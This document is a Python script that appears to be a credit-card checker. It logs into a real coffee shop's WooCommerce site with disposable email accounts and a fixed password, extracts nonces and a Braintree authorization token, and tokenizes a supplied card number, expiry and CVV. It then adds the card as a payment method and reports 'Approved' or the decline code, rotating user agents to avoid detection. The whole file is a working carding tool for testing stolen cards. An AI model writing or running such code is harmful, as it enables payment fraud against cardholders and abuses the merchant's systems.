import httpx
import re
import random
import base64
import asyncio
# from proxy import proxies_aiohttp
from user_agent import generate_user_agent
# from bs4 import BeautifulSoup

async def mb3(cc, mm, yy, cvc):
    proxy = {
        
    }
    try:
        emails = [
            "saxerab985@confmin.com",
            "gojija2820@bflcafe.com",
            "sexiceg204@cantozil.com",
            "lisayo5358@ikowat.com",
            "ciwodew596@confmin.com",
            "biyoy24509@cantozil.com",
            "davota6428@cantozil.com",
            "taban46838@cantozil.com",
            "joberih412@ikowat.com",
            "dekeh49661@bflcafe.com",
            "vepahi4080@confmin.com",
            "xesobob413@confmin.com",
            "pifijij182@ikowat.com",
            "gelad24920@cantozil.com",
            "bifeb33348@bflcafe.com"
        ]
        email = random.choice(emails)
        user = generate_user_agent()

        async with httpx.AsyncClient(proxies=proxy if isinstance(proxy, dict) else None) as client:
            headers = {
                'authority': 'www.tea-and-coffee.com',
                'user-agent': user,
                'content-type': 'application/x-www-form-urlencoded',
            }
            try:
                response = await client.get('https://www.tea-and-coffee.com/account', headers=headers)
                nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1)
            except:
                return 'Error: 1st request failed'

            data = {
                'username': email,
                'password': 'A@Amir5520055',
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': '/account/add-payment-method',
                'login': 'Log in',
            }
            try:
                response = await client.post(
                    'https://www.tea-and-coffee.com/account',
                    headers=headers,
                    data=data,
                )
            except:
                return 'Error: 2nd request failed'
            headers.update({
                'referer': 'https://www.tea-and-coffee.com/account/payment-methods',
            })
            try:
                response = await client.get(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom',
                    headers=headers,
                )

                nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
            except:
                return 'Error: 3rd request failed'
            headers.update({
                'x-requested-with': 'XMLHttpRequest',
                'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
            })

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            }

            try:
                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    headers=headers,
                    data=data,
                )
                
                enc = response.json()['data']
                dec = base64.b64decode(enc).decode('utf-8')
                authorization = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
            except:
                return 'Error: 4th request failed'

            headersn = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'authorization': f'Bearer {authorization}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '3702b387-b798-4a86-a417-bb80fdbfc0ae',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
            }
            try:
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=headersn,
                    json=json_data,
                )

                tok = response.json()['data']['tokenizeCreditCard']['token']
            except:
                return 'Error: 5th request failed'

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.tea-and-coffee.com',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
            }

            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '20.78',
                'wc_braintree_credit_card_payment_nonce': tok,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': '/account/add-payment-method-custom',
                'woocommerce_add_payment_method': '1',
            }
            try:
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom',
                    headers=headers,
                    data=data
                )
                if 'Nice! New payment method added' in response.text or 'Payment method successfully added.' in response.text:
                    return '1000: Approved'
                else:
                    text = response.text
                    pattern = r'<ul class="woocommerce-error" role="alert">\s*<li>\s*Status code\s*([^<]+)\s*</li>'
                    
                    match = re.search(pattern, text)
                    if match:
                        result = match.group(1).strip()
                        print(result)
                        if 'risk_threshold' in text:
                            return "RISK_BIN: Retry Later"
                        return result
            except:
                return 'Error: 6th request failed'

    except Exception as e:
        return f'Error: {e}'
